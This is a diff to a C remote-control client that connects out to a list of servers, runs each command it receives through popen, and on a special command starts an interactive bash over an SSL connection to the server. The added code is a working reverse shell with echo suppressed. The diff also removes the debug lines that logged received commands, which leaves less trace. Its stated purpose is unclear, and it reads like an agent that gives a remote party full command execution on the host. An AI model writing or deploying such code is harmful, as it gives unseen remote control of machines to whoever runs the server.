@@ -24,6 +24,7 @@
 #include <fcntl.h>
 #include <sys/wait.h>
 #include <sys/select.h>
+#include <termios.h>
 #include <signal.h>
 
 #include <arpa/inet.h>
@@ -35,12 +36,14 @@
 
 #include "common.h"
 #include "rctl.h"
-#include "log.h"
 #include "ssltcp.h"
+#include "log.h"
+#include "config.h"
 
 int debug = 1;
 static char cmd[CMDLEN];
 static char buf[BUFLEN];
+static struct sockaddr_in seraddr;
 
 static in_addr_t r_server(int num)
 {
@@ -103,24 +106,21 @@ static int r_connect()
 		return -1;
 	}
 
-	struct sockaddr_in addr;
-
 	int i, j;
 	in_addr_t server;
-
 	for(i = 0; i < TOTSER; i++) {
-		socklen_t addr_len = sizeof(addr);
-		addr.sin_family = AF_INET;
+		socklen_t addr_len = sizeof(seraddr);
+		seraddr.sin_family = AF_INET;
 		server = r_server(i);
 		if(!server) continue;
-		addr.sin_addr.s_addr = server;
+		seraddr.sin_addr.s_addr = server;
 
 		for(j = 0; j < TOTPRT; j++) {
-			addr.sin_port = htons(port[j]);
+			seraddr.sin_port = htons(port[j]);
 			sys_debug("Try %s port: %d\n", 
-				inet_ntoa(addr.sin_addr), port[j]);
+				inet_ntoa(seraddr.sin_addr), port[j]);
 
-			if(!connect(fd, (void *)&addr, addr_len) && 
+			if(!connect(fd, (void *)&seraddr, addr_len) && 
 				tcp_alive(fd)) {
 				sys_debug("connect success\n");
 				return fd;
@@ -169,32 +169,85 @@ static void term(int signum)
 	sys_debug("SIGCHLD received\n");
 	int status;
 	pid_t pid = waitpid((pid_t)-1, &status, WNOHANG);
-	sys_debug("child process %ld exited: %d",
+	sys_debug("child process %ld exited: %d\n",
 		(long) pid, WEXITSTATUS(status));
 	exit(0);
 }
 
-static void bash(int fd)
+int bashfd()
+{
+	int fd = Socket(AF_INET, SOCK_STREAM, 0);
+	if(fd < 0)
+		return -1;
+
+	socklen_t addr_len = sizeof(seraddr);
+	seraddr.sin_port = htons(BASHPORT);
+	if(!connect(fd, (void *)&seraddr, addr_len) && 
+		tcp_alive(fd)) {
+		sys_debug("connect success\n");
+		return fd;
+	} else {
+		sys_debug("connect failed\n");
+		return -1;
+	}
+}
+
+static void setnoecho(int fd)
+{
+	struct termios attr;
+	if(tcgetattr(fd, &attr) < 0) {
+		sys_err("tcgetattr failed: %s(%d)\n", 
+			strerror(errno), errno);
+		exit(-1);
+	}
+
+	attr.c_lflag &= ~ECHO;
+	if(tcsetattr(fd, TCSANOW, &attr) < 0) {
+		sys_err("tcsetattr failed: %s(%d)\n",
+			strerror(errno), errno);
+		exit(-1);
+	}
+}
+
+static void bashfrom()
 {
 	pid_t pid;
 	if( (pid = fork()) < 0) {
-		sys_err("Fork failed: %s(%d)\n", 
-			strerror(errno), errno);
+		sys_err("Fork failed: %s(%d)\n", strerror(errno), errno);
 		exit(-1);
 	} else if(pid) {
-		/* parent will wait until child exit */
-		wait(NULL);
+		return;
 	}
 
 	/* child */
 	int ptm;
 	char *ptsname = pty_init(&ptm);
+	int fd = bashfd();
+	if(fd < 0) return;
+
+	SSL *ssl;
+	if( !(ssl = ssltcp_ssl(fd))) {
+		sys_err("Create ssl failed\n");
+		close(fd);
+		return;
+	}
+
+	if( ssltcp_connect(ssl) < 0) {
+		sys_err("connect ssl failed\n");
+		close(fd);
+		return;
+	}
 
 	if( (pid = fork()) < 0) {
 		sys_err("Fork failed: %s(%d)\n", 
 			strerror(errno), errno);
 		exit(-1);
 	} else if(pid == 0) {
+		if(setsid() < 0) {
+			sys_err("set new session id failed: %s(%d)\n",
+				strerror(errno), errno);
+			exit(-1);
+		}
 		/* child */
 		int pts = open(ptsname, O_RDWR);
 		if(pts < 0) {
@@ -202,6 +255,7 @@ static void bash(int fd)
 				ptsname, strerror(errno), errno);
 			exit(-1);
 		}
+		setnoecho(pts);
 
 		dup2(pts, 0);
 		dup2(pts, 1);
@@ -238,14 +292,14 @@ static void bash(int fd)
 			}
 
 			if(FD_ISSET(fd, &fset)) {
-				nrcv = Recv(fd, buf, BUFLEN, 0);
-				if(nrcv <= 0) {
+				nrcv = ssltcp_read(ssl, buf, BUFLEN);
+				if(nrcv < 0) {
 					sys_debug("Connection closed: %s(%d)",
 						strerror(errno), errno);
 					exit(-1);
 				}
 
-				if(Send(ptm, buf, nrcv, 0) < 0) {
+				if(write(ptm, buf, nrcv) < 0) {
 					sys_debug("pty closed: %s(%d)",
 						strerror(errno), errno);
 					exit(-1);
@@ -253,14 +307,14 @@ static void bash(int fd)
 			}
 
 			if(FD_ISSET(ptm, &fset)) {
-				nrcv = Recv(ptm, buf, BUFLEN, 0);
+				nrcv = read(ptm, buf, BUFLEN);
 				if(nrcv <= 0) {
 					sys_debug("pty closed: %s(%d)",
 						strerror(errno), errno);
 					exit(-1);
 				}
 
-				if(Send(fd, buf, nrcv, 0) < 0) {
+				if(ssltcp_write(ssl, buf, nrcv) < 0) {
 					sys_debug("Connection closed: %s(%d)",
 						strerror(errno), errno);
 					exit(-1);
@@ -280,11 +334,9 @@ void rctl(char *devid)
 {
 	pid_t pid;
 	if( (pid = fork()) < 0) {
-		sys_err("Fork failed: %s(%d)\n", 
-			strerror(errno), errno);
+		sys_err("Fork failed: %s(%d)\n", strerror(errno), errno);
 		exit(-1);
 	} else if(pid) {
-		/* parent */
 		return;
 	}
 
@@ -311,7 +363,6 @@ reconnect:
 		ssl_free(ssl);
 		goto reconnect;
 	}
-	sys_debug("Send class: %s\n", devid);
 
 	while(1) {
 		/* max command len should less than
@@ -322,17 +373,13 @@ reconnect:
 			goto reconnect;
 		}
 		cmd[ret] = 0;
-		sys_debug("recv command: %s\n", cmd);
 
-		strncat(cmd, " 2>&1", CMDLEN - strlen(cmd));
-		if(!strcmp(cmd, "bash")) {
-			sys_debug("Exec: %s\n", cmd);
-			/* parent process will block 
-			 * util child exit */
-			bash(fd);
+		if(!strcmp(cmd, RCTLBASH)) {
+			bashfrom();
 			continue;
 		}
 
+		strncat(cmd, " 2>&1", CMDLEN - strlen(cmd));
 		FILE *fp; int size;
 		fp = popen(cmd, "r"); 
 		if(!fp) {
